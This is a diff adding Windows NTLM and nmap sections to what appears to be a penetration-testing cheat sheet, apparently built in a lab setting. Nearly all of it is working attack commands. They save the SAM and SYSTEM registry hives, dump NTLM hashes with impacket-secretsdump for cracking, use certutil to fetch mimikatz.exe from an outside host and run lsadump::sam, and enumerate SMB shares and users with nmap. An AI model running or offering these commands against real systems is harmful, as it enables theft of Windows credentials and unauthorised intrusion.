@@ -249,3 +249,30 @@ EOF
 
 
 
+##################################### WINDOWS NTLM ######################################
+
+#dump NTLM hashes with local access to target machine
+
+reg save nklm/sam c:/Users/<current_users>/<writable_directory>/sam
+
+reg save nklm/system c:/Users/<current_users>/<writable_directory>/system
+
+Download the sam and system file to local machine
+
+impacket-secretsdump -sam sam -system system LOCAL
+
+then crack the hashes obtained with john, hashcat, crackstation etc.
+
+#upload mimikatz and dump lsa
+
+certutil.exe -urlcache -f http://10.10.131.247:8080/mimikatz.exe mimikatz.exe
+
+mimikatz.exe
+
+lsadump::sam
+
+
+
+################################### NMAP CHEATSHEET #######################################
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.19.158
